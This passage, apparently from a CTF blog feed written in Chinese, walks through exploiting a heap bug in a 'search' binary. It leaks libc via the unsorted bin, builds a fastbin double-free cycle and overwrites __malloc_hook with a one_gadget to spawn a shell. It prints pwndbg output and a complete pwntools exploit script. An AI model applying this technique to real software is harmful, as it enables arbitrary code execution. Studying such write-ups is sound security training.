class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br></pre></td></tr></table></figure><h3 id="构造-fastbin-循环链表"><a href="#构造-fastbin-循环链表" class="headerlink" title="构造 fastbin 循环链表"></a>构造 fastbin 循环链表</h3><p>由于最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是 0x7f。即，所需要设置的 fast bin 的数据字节部分的大小为 0x60。这里按照如下方式构造:</p><ol><li>分别索引句子 a，索引句子 b，索引句子 c，则此时单词链表中索引的句子的相对顺序为 c-&gt;b-&gt;a。假设句子 a 为<code>&#39;a&#39; * 0x5d + &#39;d&#39;</code>，句子 b 为<code>&#39;b&#39; * 0x5d + &#39;d&#39;</code>，句子 c 类似。</li><li>索引单词 d，三个均删除，则此时 fastbin 中的链表情况为 a-&gt;b-&gt;c-&gt;NULL，这是因为首先释放的是句子 c，最后释放的是句子 a。这时，搜索单词时 *i-&gt;sentence_ptr 对于 a, b 来说都是可以绕过的。</li><li>此时再次删除搜索单词 \x00。首先遍历的是 c，但是 c 的验证不通过；其次遍历的是 b，验证通过，将其释放；其次遍历的是 a，验证通过，但是不删除。则此时 fastbin 的情况为 b-&gt;a-&gt;b-&gt;a-&gt;…。即已经构成了 double free b 的情况。由于先前为了 leak libc 还建立一个句子，所以还有一个单词可以比较，这里也不删除。</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2. create cycle fastbin 0x70 size</span></span><br><span class="line">index_sentence(<span class="string">'a'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#a</span></span><br><span class="line">index_sentence(<span class="string">'b'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#b</span></span><br><span class="line">index_sentence(<span class="string">'c'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">search_word(<span class="string">'d'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b-&gt;a-&gt;b-&gt;a-&gt;...</span></span><br><span class="line">search_word(<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'n'</span>)</span><br></pre></td></tr></table></figure><h3 id="分配-malloc-hook-附近-chunk"><a href="#分配-malloc-hook-附近-chunk" class="headerlink" title="分配 malloc_hook 附近 chunk"></a>分配 malloc_hook 附近 chunk</h3><p>此时，fastbin 的链表为 b-&gt;a-&gt;b-&gt;a-&gt;…，则可以在申请第一个相同大小的 chunk 时，设置 b 的 fd 为 malloc_hook 附近处的 chunk 0x7fd798586aed。</p><p>（find_fake_fast 是真的骚，可惜环境弄坏现在还没弄好）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">print</span> (void*)&amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x7fd798586b20 &lt;main_arena&gt;</span><br><span class="line">pwndbg&gt; x/8gx 0x7fd798586b20-16</span><br><span class="line">0x7fd798586b10 &lt;__malloc_hook&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7fd798586b20 &lt;main_arena&gt;:    0x0000000000000000  0x0000000000bce130</span><br><span class="line">0x7fd798586b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7fd798586b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">pwndbg&gt; find_fake_fast 0x7fd798586b10 0x7f</span><br><span class="line">FAKE CHUNKS</span><br><span class="line">0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA &#123;</span><br><span class="line">  prev_size = 15535264025435701248,</span><br><span class="line">  size = 127,</span><br><span class="line">  fd = 0xd798247e20000000,</span><br><span class="line">  bk = 0xd798247a0000007f,</span><br><span class="line">  fd_nextsize = 0x7f,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> /x 0x7fd798586b10-0x7fd798586aed</span><br><span class="line"><span class="variable">$2</span> = 0x23</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> /x 0x7fd798586b20-0x7fd798586aed</span><br><span class="line"><span class="variable">$3</span> = 0x33</span><br></pre></td></tr></table></figure><p>那么当再次分配 b 的时候，由于此时 b 的 fd 已经被修改为了 malloc_hook 附近的地址，所以这时候再次分配一个 chunk，就会指向 0x7fd798586aed。 此后便只需要将 malloc_hook 修改为 libc 里这段骚东西就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000F02A4                 mov     rax, cs:environ_ptr_0</span><br><span class="line">.text:00000000000F02AB                 lea     rsi, [rsp+1B8h+var_168]</span><br><span class="line">.text:00000000000F02B0                 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000000F02B7                 mov     rdx, [rax]</span><br><span class="line">.text:00000000000F02BA                 call    execve</span><br></pre></td></tr></table></figure><h2 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.binary = <span class="string">"./search"</span></span><br><span class="line">search = context.binary</span><br><span class="line">p = process(<span class="string">'./search'</span>)</span><br><span class="line">e = ELF(<span class="string">'./search'</span>)</span><br><span class="line">l = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>                      <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>                     <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>       <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>        <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>        <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">unsortedbin_offset_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_sentence</span><span class="params">(s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.send(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_word</span><span class="params">(word)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">    p.sendline(str(len(word)))</span><br><span class="line">    p.send(word)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'s'</span> * <span class="number">0x85</span> + <span class="string">' m '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'m'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 1. leak libc base</span></span><br><span class="line">    unsortedbin_addr = leak_libc()</span><br><span class="line">    main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena</span><br><span class="line">    libc_base = main_arena_addr - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'unsortedbin addr: '</span> + hex(unsortedbin_addr))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. create cycle fastbin 0x70 size</span></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#a</span></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#b</span></span><br><span class="line">    index_sentence(<span class="string">'c'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">    search_word(<span class="string">'d'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b-&gt;a-&gt;b-&gt;a-&gt;...</span></span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. fastbin attack to malloc_hook nearby chunk</span></span><br><span class="line">    fake_chunk_addr = main_arena_addr - <span class="number">0x33</span></span><br><span class="line">    fake_chunk = p64(fake_chunk_addr).ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(fake_chunk)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看完了以后“好像是这么回事”，自己解题“不会”。</p><ol><li>通过 ‘\x00’ 等特殊字符绕过验证使其 double free、use after free。</li><li>通过 unsort bin addr 找到 libc。</li><li>libc 里有现成的骚东西，把 malloc hook 的改成那个即可。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;程序分析&quot;&gt;&lt;a href=&quot;#程序分析&quot; class=&quot;headerlink&quot; title=&quot;程序分析&quot;&gt;&lt;/a&gt;程序分析&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/categories/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/categories/CTF/pwn/"/>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/tags/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
</feed>
